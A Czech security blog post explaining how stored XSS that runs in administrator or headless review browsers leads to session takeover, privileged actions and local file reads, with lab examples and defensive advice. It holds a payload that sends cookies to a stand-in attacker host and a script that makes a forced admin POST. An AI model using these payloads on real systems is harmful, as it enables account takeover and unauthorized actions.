---
layout: post
author: Tomáš Matějíček
title: "Stored XSS a admin browser a headless review jako útoková plocha"
date: 2019-11-28
tags: xss web admin review browser
---
## Úvod a kontext

Stored XSS se často vysvětluje přes krádež cookie v běžném uživatelském prohlížeči. To je užitečný začátek, ale v praxi bývá mnohem zajímavější jiný scénář: škodlivý obsah se nespustí u útočníka ani u náhodného návštěvníka, ale v browseru administrátora, review robota nebo exportním workflow, které má vyšší oprávnění, přístup k interním funkcím nebo jinou síťovou pozici.

Právě tehdy se z "obyčejné XSS" stává pivot do další vrstvy. Jednou vede k admin session a localhost-only nástroji, jindy ke čtení `file://` cesty a jindy ke spuštění privilegované backendové akce. Článek proto neřeší XSS jako samostatnou webovou chybu, ale jako vstup do cizího browser kontextu.

## Proč je admin browser jiná bezpečnostní hranice

Browser administrátora nebo headless review procesu se od běžného návštěvníka liší ve třech důležitých věcech:

- nese vyšší oprávnění a jiný session kontext,
- bývá přihlášený do rozhraní, které veřejný uživatel nevidí,
- často běží v infrastruktuře, která má přístup k interním endpointům, lokálním souborům nebo automatizačním funkcím.

To znamená, že stejný payload může mít úplně jiný dopad podle toho, kde se vykoná. V uživatelském browseru způsobí nepříjemnost. V admin browseru může změnit konfiguraci, spustit interní akci nebo otevřít cestu k server-side kompromitaci.

## Kde takový kontext typicky vzniká

Nejčastěji nejde o "administraci" v úzkém slova smyslu. Rizikový kontext se objevuje v celé řadě běžných workflow:

- moderace komentářů, ticketů nebo převodních požadavků,
- interní náhledy Markdownu, HTML nebo rich textu,
- automatizované review roboty,
- exportní nebo renderovací služby, které otevírají uživatelský obsah,
- backoffice aplikace, ve kterých operátor pracuje s daty od zákazníků.

Společný jmenovatel je pořád stejný: nedůvěryhodný obsah se vykoná v prostředí, které má větší pravomoci než jeho autor.

## Tři praktické vzory dopadu

Stored XSS v privilegovaném browseru má v praxi několik opakujících se podob.

### 1. Převzetí privilegované session

Nejjednodušší varianta je, že JavaScript přečte cookies, tokeny nebo jiné identifikátory session a pošle je útočníkovi. Sama o sobě to není nová myšlenka. Rozhodující je ale to, že cílem už není běžný uživatel, nýbrž účet, který:

- schvaluje transakce,
- vidí interní funkce,
- otevírá administrativní rozhraní,
- nebo má přístup k localhost-only nástroji.

Typický minimální payload může vypadat takto:

```html
<img src="x" onerror="new Image().src='https://attacker.example/log?c='+encodeURIComponent(document.cookie)">
```

Takový payload sám o sobě systém nekompromituje. Jen přesune důvěryhodný session kontext do rukou útočníka. V okamžiku, kdy admin session odemyká interní funkce, už vzniká druhý, mnohem silnější problém.

### 2. Spuštění privilegované akce v cizím browseru

Někdy ani není potřeba session krást. Pokud se kód spustí v již přihlášeném admin kontextu, může rovnou volat interní endpointy nebo formuláře za oběť.

Typický tvar je:

```html
<script>
fetch('/admin/rebuild', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'target=preview'
});
</script>
```

Smysl takového payloadu není v tom, že by bypassoval autentizaci. Autentizaci už zařídil browser oběti. Útočník jen zneužije toho, že administrativní workflow samo důvěřuje svému session kontextu.

### 3. Přístup k lokálním souborům nebo interní síti

Třetí varianta bývá nejvíc podceňovaná. Browser nebo renderer, který zpracovává nedůvěryhodný obsah, může mít přístup i k věcem, které veřejný web vůbec nevidí:

- `file://` cesty,
- `localhost` endpointy,
- interní hostname,
- lokální helper nástroje.

V ten moment stored XSS není jen klientská chyba. Stává se z ní most mezi nedůvěryhodným vstupem a prostředím hostu nebo interní sítě.

## Jak se tenhle vzorec projevil v konkrétních případech

Na [Bankrobberu](/bankrobber) byl komentář k bankovní transakci zobrazen v headless prohlížeči administrátora. To umožnilo vytáhnout admin cookies a převzít session v rozhraní, které obsahovalo localhost-only nástroj pro spouštění příkazů. XSS tedy nevedla k shellu přímo. Nejdřív otevřela cizí browser kontext a teprve ten odemkl interní funkci.

Na [Booku](/book) stál jiný případ na tom, že uložený JavaScript běžel v kontextu, který dokázal číst `file:///home/reader/.ssh/id_rsa`. Tam nebyla nejdůležitější session, ale hranice mezi webovým workflow a lokálními soubory hostu. Jakmile se vykonal kód ve správném rendereru, XSS vydala rovnou SSH materiál.

Na [Cerealu](/cereal) se JavaScript spouštěl v interním admin preview a jeho hodnota nebyla v prohlížení DOMu, ale v tom, že mohl poslat autentizovaný požadavek, který backend následně zpracoval server-side. Tady stored XSS fungovala jako ovladač cizí privilegované akce, ne jako finální exploit sama o sobě.

## Co je na těchto scénářích jiné než u "běžné XSS"

Je užitečné pojmenovat rozdíl explicitně:

- běžná stored XSS útočí hlavně na návštěvníka stránky,
- stored XSS v admin nebo review workflow útočí na bezpečnostní hranici mezi nedůvěryhodným obsahem a privilegovaným zpracováním.

To má dva důsledky.

První: payload se navrhuje podle toho, co umí oběť, ne podle toho, co umí veřejná aplikace.  
Druhý: obrana nespočívá jen v ochraně session, ale i v izolaci samotného prostředí, které nedůvěryhodný obsah renderuje.

## Na co se při analýze zaměřit

Pokud aplikace pracuje s uživatelským obsahem, vyplatí se při review projít několik velmi konkrétních otázek.

### Kdo obsah otevírá

- běžný uživatel,
- moderátor,
- administrátor,
- headless robot,
- exportní nebo renderovací služba.

Bez této odpovědi nelze rozumně odhadnout dopad.

### Jaká oprávnění má cílový kontext

- je přihlášený do administrace,
- vidí interní endpointy,
- má přístup k jinému originu,
- běží na stejném hostu jako další citlivé služby,
- umí otevírat lokální soubory nebo náhledy dokumentů.

### Co lze z browseru skutečně dělat

- číst session nebo CSRF tokeny,
- posílat privilegované požadavky,
- načítat `file://` nebo `http://localhost`,
- triggerovat import, export nebo download workflow,
- zasáhnout další backendovou akci, která už má server-side dopad.

## Obrana a návrh bezpečnějších workflow

### 1. U privilegovaného review nespoléhat jen na sanitizaci

Sanitizace HTML je důležitá, ale u admin workflow nestačí chápat ji jako kosmetickou obranu. Jakmile se v privilegovaném kontextu vykoná jediný nechtěný skript, dopad bývá řádově vyšší než u běžného self-XSS.

### 2. Oddělit browser, který zpracovává nedůvěryhodný obsah

Review robot nebo interní preview by neměly běžet v prostředí, které:

- má přístup k lokálním souborům,
- sdílí session s administrací,
- vidí interní localhost-only služby,
- nebo běží pod účtem s přístupem k dalším tajemstvím.

Jinými slovy: nedůvěryhodný obsah se nemá renderovat ve stejném bezpečnostním kontextu, který spravuje systém.

### 3. Privilegované endpointy mají chtít víc než jen session

Pokud admin browser dokáže jediným `fetch()` zavolat citlivou akci, obrana stojí na velmi tenké vrstvě. Kritické operace mají mít samostatnou autorizaci, ochranu proti CSRF a pokud možno i potvrzovací krok oddělený od pouhého zobrazení obsahu.

### 4. Blokovat přístup rendererů k lokálním souborům a interní síti

Tam, kde je to možné, má být browser nebo renderer spuštěný:

- bez přístupu k `file://`,
- bez důvěry k localhost-only endpointům,
- s omezenou sítí,
- a bez sdílených produkčních session.

### 5. Auditovat, co admin workflow vlastně dělá

Velká část problémů nevzniká v klasické frontendové vrstvě, ale v interních náhledech, moderaci a exportech. To jsou přesně ty části systému, které se v běžném security review snadno přehlédnou.

## Shrnutí klíčových poznatků

- Stored XSS v admin nebo headless workflow není jen krádež cookie, ale útok na privilegovaný browser kontext.
- Skutečný dopad určuje to, kdo obsah otevírá, k čemu má přístup a jaké akce může jeho browser provést.
- V praxi se stored XSS často mění na převzetí admin session, spouštění privilegovaných akcí nebo čtení lokálních souborů a interních endpointů.
- Obrana nestojí jen na sanitizaci, ale i na izolaci review prostředí a na tom, aby interní funkce nespoléhaly pouze na to, že požadavek přišel z "důvěryhodného" browseru.

## Co si odnést do praxe

- U stored XSS je vždy potřeba zjistit, v čím browseru nebo rendereru se payload skutečně vykoná. Bez toho nejde správně odhadnout dopad.
- Moderace, admin preview a headless review jsou samostatná bezpečnostní hranice. Nesmějí sdílet zbytečně široká oprávnění s produkční administrací nebo hostem.
- Pokud privilegovaný browser umí číst lokální soubory, volat localhost nebo vykonávat citlivé akce jen na základě session, stored XSS se velmi rychle mění z klientské chyby na plnohodnotný serverový incident.
